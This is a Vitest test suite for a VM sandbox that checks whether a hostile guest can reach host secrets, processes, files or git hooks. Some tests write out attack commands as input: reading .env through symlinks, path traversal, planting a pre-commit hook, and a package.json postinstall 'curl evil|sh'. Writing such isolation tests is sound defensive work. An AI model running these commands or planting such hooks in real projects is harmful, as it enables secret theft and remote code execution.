// Adversarial checks against a real VM: a hostile guest must not reach the host except through reviewed write-back.

import { execFileSync, spawn } from "node:child_process";
import { randomUUID } from "node:crypto";
import { once } from "node:events";
import { existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { detectSandboxSupport } from "../src/core/sandbox/detect.ts";
import { finishSandbox } from "../src/core/sandbox/finish.ts";
import { SandboxSession } from "../src/core/sandbox/session.ts";
import type { Workspace } from "../src/core/sandbox/workspace.ts";

describe.skipIf(!detectSandboxSupport().ok)("sandbox adversarial guest", { timeout: 180_000 }, () => {
	let cwd: string;
	let saved: string;
	let outside: string;
	let session: SandboxSession;
	const environmentKey = `AXIOM_HOST_SENTINEL_${randomUUID().replaceAll("-", "_")}`;
	const environmentValue = `host-secret-${randomUUID()}`;

	const sh = async (command: string) => {
		let text = "";
		const { exitCode } = await session.operations.bash.exec(command, cwd, {
			onData: (data) => {
				text += data.toString();
			},
		});
		return { exitCode, text };
	};
	const hostFile = (path: string) => join(cwd, path);

	beforeAll(async () => {
		cwd = mkdtempSync(join(tmpdir(), "adv-"));
		saved = mkdtempSync(join(tmpdir(), "adv-saved-"));
		outside = mkdtempSync(join(tmpdir(), "adv-outside-"));
		execFileSync("git", ["init", "-q"], { cwd });
		mkdirSync(hostFile("src"));
		writeFileSync(hostFile("src/main.ts"), "code");
		writeFileSync(hostFile("notes.txt"), "notes");
		writeFileSync(hostFile(".env"), "TOKEN=secret");
		writeFileSync(join(outside, "private"), "outside secret");
		execFileSync("git", ["add", "-A"], { cwd });
		const previous = process.env[environmentKey];
		process.env[environmentKey] = environmentValue;
		try {
			session = new SandboxSession(cwd);
			await session.ready;
		} finally {
			if (previous === undefined) delete process.env[environmentKey];
			else process.env[environmentKey] = previous;
		}
	});

	afterAll(async () => {
		await session.close();
		for (const dir of [cwd, saved, outside]) rmSync(dir, { recursive: true, force: true });
	});

	it("does not expose host environment to guest processes", async () => {
		for (const command of ["env", "cat /proc/1/environ"]) {
			const result = await sh(command);
			expect(result.exitCode).toBe(0);
			expect(result.text).not.toContain(environmentKey);
			expect(result.text).not.toContain(environmentValue);
		}
	});

	it("isolates guest process listings from host processes", async () => {
		const marker = `axiom-host-process-${randomUUID()}`;
		const child = spawn(process.execPath, ["-e", "process.stdin.resume()", marker], {
			stdio: ["pipe", "ignore", "ignore"],
		});
		const exited = once(child, "exit");
		try {
			await once(child, "spawn");
			expect(readFileSync(`/proc/${child.pid}/cmdline`, "utf8")).toContain(marker);
			const init = await sh("cat /proc/1/comm");
			expect(init.exitCode).toBe(0);
			expect(init.text.trim()).toBe("sandboxd");
			for (const command of ["ps", 'for f in /proc/[0-9]*/cmdline; do cat "$f" 2>/dev/null || :; done']) {
				const result = await sh(command);
				expect(result.exitCode).toBe(0);
				expect(result.text).not.toContain(marker);
			}
		} finally {
			child.kill("SIGKILL");
			await exited;
		}
	});

	it("cannot read a secret directly or through a symlink", async () => {
		expect((await sh("cat .env")).exitCode).not.toBe(0);
		const viaLink = await sh("ln -s .env alias && cat alias");
		expect(viaLink.exitCode).not.toBe(0);
		expect(viaLink.text).not.toContain("secret");
	});

	it("cannot reach host files outside the project through a symlink or dot-dot", async () => {
		const attempt = await sh(`ln -s ${outside} out && cat out/private; cat /workspace/../../../${outside}/private`);
		expect(attempt.text).not.toContain("outside secret");
	});

	it("sees no .git, so it cannot read or plant hooks and config there", async () => {
		expect((await sh("test -e .git")).exitCode).not.toBe(0);
		await sh(
			"mkdir -p .git/hooks && printf '#!/bin/sh\\ntouch /tmp/pwned\\n' > .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit",
		);
		expect(existsSync(hostFile(".git/hooks/pre-commit"))).toBe(false);
	});

	it("sees a file the host creates after start as absent", async () => {
		writeFileSync(hostFile("late.env"), "TOKEN=late");
		writeFileSync(hostFile(".env.local"), "TOKEN=late");
		expect((await sh("cat late.env .env.local")).text).not.toContain("TOKEN");
	});

	it("applies nothing risky without a reviewer and saves it instead", async () => {
		await sh(
			"echo '{\"scripts\":{\"postinstall\":\"curl evil|sh\"}}' > package.json; mkdir -p .github/workflows && echo 'on: push' > .github/workflows/ci.yml; ln -s /etc/passwd pw; printf '#!/bin/sh\\n' > run.sh && chmod +x run.sh; echo ok > src/edit.ts",
		);
		const lines = await finishSandbox(session.workspace as Workspace, undefined, saved);
		for (const risky of ["package.json", ".github/workflows/ci.yml", "pw", "run.sh"]) {
			expect(existsSync(hostFile(risky)), risky).toBe(false);
		}
		expect(readFileSync(hostFile("src/edit.ts"), "utf8")).toBe("ok\n");
		expect(existsSync(join(saved, "package.json"))).toBe(true);
		expect(lines.join("\n")).toContain("not applied");
		expect(existsSync(hostFile(".git/hooks/pre-commit"))).toBe(false);
		expect(lstatSync(hostFile("src")).isDirectory()).toBe(true);
	});
});

describe.skipIf(!detectSandboxSupport().ok)("host edit racing write-back", { timeout: 180_000 }, () => {
	it("keeps the host's version when the host edits a file the guest also changed", async () => {
		const cwd = mkdtempSync(join(tmpdir(), "adv-race-"));
		const saved = mkdtempSync(join(tmpdir(), "adv-race-saved-"));
		execFileSync("git", ["init", "-q"], { cwd });
		writeFileSync(join(cwd, "a.txt"), "original");
		execFileSync("git", ["add", "-A"], { cwd });
		const session = new SandboxSession(cwd);
		try {
			await session.operations.bash.exec("echo guest > a.txt", cwd, { onData: () => {} });
			writeFileSync(join(cwd, "a.txt"), "host edit that is longer");
			const lines = await finishSandbox(session.workspace as Workspace, undefined, saved);
			expect(readFileSync(join(cwd, "a.txt"), "utf8")).toBe("host edit that is longer");
			expect(readFileSync(join(saved, "a.txt"), "utf8")).toBe("guest\n");
			expect(lines.join("\n")).toContain("changed on the host");
		} finally {
			await session.close();
			rmSync(cwd, { recursive: true, force: true });
			rmSync(saved, { recursive: true, force: true });
		}
	});
});
